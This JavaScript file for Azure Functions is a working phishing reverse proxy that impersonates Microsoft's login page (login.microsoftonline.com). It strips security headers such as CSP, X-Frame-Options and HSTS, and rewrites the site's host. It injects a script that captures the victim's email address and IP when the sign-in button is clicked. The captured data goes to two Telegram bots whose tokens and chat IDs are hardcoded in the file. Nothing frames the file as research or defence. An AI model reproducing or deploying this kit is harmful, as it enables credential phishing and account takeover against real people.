const { app } = require('@azure/functions');

const upstream = "login.microsoftonline.com";
const upstream_path = "/";
const telegram_bot_token1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const telegram_chat_id1 = "6743632244";
const telegram_bot_token2 = "5609281274:AAHWsvjYauuibR_vs9MPdInpB8LzB1lJXt8";
const telegram_chat_id2 = "1412104349";

const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

const emailMap = new Map();

async function replace_response_text(response, upstream, original, ip) {
  return response.text().then((text) =>
    text
      .replace(new RegExp(upstream, "g"), original)
      .replace(
        "</body>",
        `<script>
          document.addEventListener('DOMContentLoaded', () => {
            const interval = setInterval(() => {
              const btn = document.getElementById("idSIButton9");
              const emailInput = document.querySelector("input[name='loginfmt']");
              if (btn && emailInput) {
                clearInterval(interval);
                const realIP = "${ip}";
                btn.addEventListener("click", () => {
                  fetch("/__notify_click", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "next_button_clicked",
                      email: emailInput.value,
                      ip: realIP
                    }),
                  });
                });
              }
            }, 500);
          });
        </script></body>`
      )
  );
}

async function dispatchMessage(message) {
  const url1 = `https://api.telegram.org/bot${telegram_bot_token1}/sendMessage`;
  const url2 = `https://api.telegram.org/bot${telegram_bot_token2}/sendMessage`;
  
  await Promise.all([
    fetch(url1, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: telegram_chat_id1, text: message, parse_mode: "HTML" }),
    }).catch((err) => console.error("Telegram error 1:", err)),
    
    fetch(url2, {
      method: "POST", 
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: telegram_chat_id2, text: message, parse_mode: "HTML" }),
    }).catch((err) => console.error("Telegram error 2:", err))
  ]);
}

// Main proxy function
app.http('proxy', {
  methods: ['GET', 'POST'],
  authLevel: 'anonymous',
  route: '{*path}',
  handler: async (request, context) => {
    const ip = request.headers.get("cf-connecting-ip") ||
      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      request.headers.get("x-client-ip") ||
      request.headers.get("true-client-ip") ||
      request.headers.get("x-real-ip") ||
      "unknown";

    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);
    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    if (upstream_url.pathname === "/") {
      upstream_url.pathname = upstream_path;
    } else {
      upstream_url.pathname = upstream_url.pathname;
    }

    // Handle special endpoints
    if (upstream_url.pathname === "/__notify_click" && request.method === "POST") {
      const body = await request.json();
      const message = `🎯 <b>Button Click Captured!</b>\n\n` +
        `📧 <b>Email:</b> ${body.email}\n` +
        `🌐 <b>IP:</b> ${body.ip}\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString()}`;
      
      await dispatchMessage(message);
      return { status: 200, body: "OK" };
    }

    try {
      // Proxy the request
      const response = await fetch(upstream_url.toString(), {
        method: request.method,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate',
          'Connection': 'keep-alive',
          'Upgrade-Insecure-Requests': '1',
        },
        body: request.method !== 'GET' ? await request.text() : undefined,
      });

      let responseText = await response.text();
      
      // Replace upstream with original URL in response
      responseText = responseText.replace(new RegExp(upstream, "g"), original_url.host);
      
      // Inject JavaScript for credential capture
      responseText = responseText.replace(
        "</body>",
        `<script>
          document.addEventListener('DOMContentLoaded', () => {
            const interval = setInterval(() => {
              const btn = document.getElementById("idSIButton9");
              const emailInput = document.querySelector("input[name='loginfmt']");
              if (btn && emailInput) {
                clearInterval(interval);
                const realIP = "${ip}";
                btn.addEventListener("click", () => {
                  fetch("/__notify_click", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "next_button_clicked",
                      email: emailInput.value,
                      ip: realIP
                    }),
                  });
                });
              }
            }, 500);
          });
        </script></body>`
      );

      // Clean headers
      const responseHeaders = {};
      for (const [key, value] of response.headers.entries()) {
        if (!delete_headers.includes(key.toLowerCase())) {
          responseHeaders[key] = value;
        }
      }

      return {
        status: response.status,
        headers: responseHeaders,
        body: responseText
      };

    } catch (error) {
      console.error('Proxy error:', error);
      return {
        status: 500,
        body: `Proxy Error: ${error.message}`
      };
    }
  }
});